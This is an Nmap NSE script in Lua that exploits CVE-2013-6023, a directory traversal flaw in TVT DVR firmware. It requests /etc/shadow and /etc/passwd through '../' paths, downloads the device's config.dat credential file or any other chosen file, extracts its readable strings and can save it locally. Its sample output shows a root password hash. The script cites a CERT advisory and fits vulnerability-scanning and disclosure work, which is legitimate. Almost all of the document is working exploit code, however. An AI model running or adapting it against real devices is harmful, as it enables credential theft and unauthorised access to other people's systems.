local http = require "http"
local table = require "table"
local stdnse = require "stdnse"
local vulns = require "vulns"
local pcre = require "pcre"
local io = require "io"

description = [[
TVT TD-2308SS-B DVR and possibly other models running firmware version 
3.2.0.P-3520A-00 contain a directory traversal vulnerability. An attacker 
can use directory traversal to download critical files such as the 
config.dat file for the device which contains the credentials for the web 
interface. For example:

http://[IP ADDRESS]/../../../mnt/mtd/config/config.dat

This file can be parsed with the strings command to reveal the administrative 
user's plaintext credentials.

Advisory:
- http://www.kb.cert.org/vuls/id/785838
- http://alguienenlafisi.blogspot.com/2013/10/dvr-tvt-directory-traversal.html
]]
author = "Cesar Neira"
license = "Free as free beer"
categories = {"exploit", "vuln"}

---
--
-- @usage nmap -p 80 --script http-tvtdvr-dir-traversal.nse <target>
-- @usage nmap -p 80 --script http-tvtdvr-dir-traversal.nse --script-args targetfile=/etc/passwd,outfile=/tmp/passwd <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-tvtdvr-dir-traversal: 
-- |   VULNERABLE:
-- |   TVT TD-2308SS-B DVR contains a directory traversal vulnerability
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2013-6023
-- |     Risk factor: High  CVSSv2: 7.8 (HIGH) (AV:N/AC:L/Au:N/C:C/I:N/A:N)
-- |     Description:
-- |       TVT TD-2308SS-B DVR and possibly other models running firmware version 3.2.0.P-3520A-00 contain a directory traversal vulnerability.
-- |       An attacker can use directory traversal to download critical files such as the config.dat file for the device which contains the credentials for the web interface.
-- |     Disclosure date: 2013-10-25
-- |     Exploit results:
-- |       /etc/passwd saved to /tmp/passwd
-- |       /etc/passwd:
-- |   root:$1$$qRPK7m23GJusamGpoGLby/:0:0::/root:/bin/sh
-- |   
-- |   
-- |     References:
-- |       http://www.kb.cert.org/vuls/id/785838
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6023
-- |_      http://alguienenlafisi.blogspot.com/2013/10/dvr-tvt-directory-traversal.html
--
-- @args http-tvtdvr-dir-traversal.targetfile The target file to download. Default: /mnt/mtd/config/config.dat
-- @args http-tvtdvr-dir-traversal.strings If set to "Y" only display printable strings in target file. Default: "Y"
-- @args http-tvtdvr-dir-traversal.outfile If set it saves the target file to this location.
--
---

local DEFAULT_TARGET_FILE = "/mnt/mtd/config/config.dat"
local DIRECTORY_TRAVERSAL = "/../../.."

portrule = function(host, port)
    return (
        port.service == "http" and
        port.protocol == "tcp" and
        port.state == "open")
end

local check_vuln = function(host, port)
    local response = http.get(host, port, "/../../../etc/shadow")
    if response.body and response.status == 200 and response.body:match("root:") then
        return true
    end
    
    response = http.get(host, port, "/../../../etc/passwd")
    if response.body and response.status == 200 and response.body:match("root:") then
        return true
    end
    
    return false
end

local write_file = function(filename, contents)
    local f, err = io.open(filename, "w")
    if not f then
        return f, err
    end
    f:write(contents)
    f:close()
    return true
end

action = function(host, port)
         local vuln = {
          title = "TVT TD-2308SS-B DVR contains a directory traversal vulnerability",
          state = vulns.STATE.NOT_VULN,
          IDS = {CVE = 'CVE-2013-6023'},
          risk_factor = "High",
          scores = {
            CVSSv2 = "7.8 (HIGH) (AV:N/AC:L/Au:N/C:C/I:N/A:N)",
          },
          description = [[
TVT TD-2308SS-B DVR and possibly other models running firmware version 3.2.0.P-3520A-00 contain a directory traversal vulnerability.
An attacker can use directory traversal to download critical files such as the config.dat file for the device which contains the credentials for the web interface.]],
          references = {
            "http://www.kb.cert.org/vuls/id/785838",
            "http://alguienenlafisi.blogspot.com/2013/10/dvr-tvt-directory-traversal.html"
          },
          dates = {
            disclosure = {year = '2013', month = '10', day = '25'},
          },
          exploit_results = {},
        }
        
        local target_file = stdnse.get_script_args(SCRIPT_NAME .. ".targetfile") or DEFAULT_TARGET_FILE
        local output_file = stdnse.get_script_args(SCRIPT_NAME .. ".outfile")
        local strings = stdnse.get_script_args(SCRIPT_NAME .. ".strings") or "Y"
        
        local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
        
        local is_vulnerable = check_vuln(host, port)
        
        if is_vulnerable then
            vuln.state = vulns.STATE.EXPLOIT
            local response = http.get(host, port, DIRECTORY_TRAVERSAL .. target_file)
            if response.body and response.status == 200 then
                if output_file then
                    local status, err = write_file(output_file,  response.body)
                    if status then
                        table.insert(vuln.exploit_results, string.format("%s saved to %s", target_file, output_file))
                    else
                        table.insert(vuln.exploit_results, string.format("Error saving %s to %s: %s", target_file, output_file, err))
                    end
                end
                
                if strings == "Y" then
                    regex = pcre.new("^[[:print:]]+$", 0 , "C")
                    local cads = stdnse.strsplit("\0+", response.body)
                    local strings_only = ""
                    for index, cad in pairs(cads) do
                        local limit, limit2, match = regex:match(cad)
                        if ( limit ~= nil ) then
                            strings_only = strings_only .. cad .. "\n"
                        end
                    end
                    table.insert(vuln.exploit_results, target_file .. ":\n" .. strings_only)
                else
                    table.insert(vuln.exploit_results, target_file .. ":\n" .. response.body)
                end
            end
        end
        
        return vuln_report:make_output(vuln)
end

